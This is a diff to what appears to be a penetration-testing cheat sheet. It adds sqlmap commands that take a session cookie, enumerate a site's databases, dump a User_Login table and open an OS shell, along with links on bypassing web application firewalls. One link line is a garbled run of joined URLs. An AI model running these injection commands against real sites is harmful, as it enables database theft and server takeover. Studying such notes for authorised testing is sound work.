@@ -700,6 +700,58 @@ OS Shell = sqlmap -u 'url' --dbms=mysql --os-shell
 SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell
 ```
 
+### **SQL Injection Attack Against MSSQL to Extract Databases using sqlmap**
+
+* Login a website
+* Inspect element
+* Dev tools-\&gt;Console: document.cookie
+* sqlmap -u “[http://www.moviescope.com/viewprofile.aspx?id=1](http://www.moviescope.com/viewprofile.aspx?id=1)" — cookie=”value” –dbs
+* \-u: Specify the target URL
+* — cookie: Specify the HTTP cookie header value
+* — dbs: Enumerate DBMS databases
+* Get a list of databases
+* Select a database to extract its tables
+* sqlmap -u “[http://www.moviescope.com/viewprofile.aspx?id=1](http://www.moviescope.com/viewprofile.aspx?id=1)" — cookie=”value” -D moviescope –tables
+* \-D: Specify the DBMS database to enumerate
+* — tables: Enumerate DBMS database tables
+* Get a list of tables
+* Select a column
+* sqlmap -u “[http://www.moviescope.com/viewprofile.aspx?id=1](http://www.moviescope.com/viewprofile.aspx?id=1)" — cookie=”value” -D moviescope –T User\_Login — dump
+* Get table data of this column
+* sqlmap -u “[http://www.moviescope.com/viewprofile.aspx?id=1](http://www.moviescope.com/viewprofile.aspx?id=1)" — cookie=”value” — os-shell
+* Get the OS Shell
+* TASKLIST
+
+\
+
+
 ### Other References
 
-[https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
+{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap" %}
+
+{% embed url="https://hackertarget.com/sqlmap-tutorial/" %}
+
+{% embed url="https://www.binarytides.com/sqlmap-hacking-tutorial/" %}
+
+{% embed url="https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/" %}
+
+{% embed url="https://medium.com/@rafaelrenovaci/dvwa-solution-sql-injection-blind-sqlmap-cd1461ad336e" %}
+
+{% embed url="https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7" %}
+
+{% embed url="https://gracefulsecurity.com/sql-injection-filter-evasion-with-sqlmap/" %}
+
+{% embed url="https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3" %}
+
+{% embed url="https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF" %}
+
+{% embed url="https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/" %}
+
+[https://www.exploit-db.com/docs/english/13701-easy-methodblind-sql-injection.pdf](https://hackertarget.com/sqlmap-tutorial/https://www.binarytides.com/sqlmap-hacking-tutorial/https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/https://medium.com/@rafaelrenovaci/dvwa-solution-sql-injection-blind-sqlmap-cd1461ad336ehttps://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7https://www.exploit-db.com/docs/english/13701-easy-methodblind-sql-injection.pdfhttps://gracefulsecurity.com/sql-injection-filter-evasion-with-sqlmap/https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3https://owasp.org/www-community/attacks/SQL\_Injection\_Bypassing\_WAFhttps:/www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/)
+
+
+
+
+
+
+
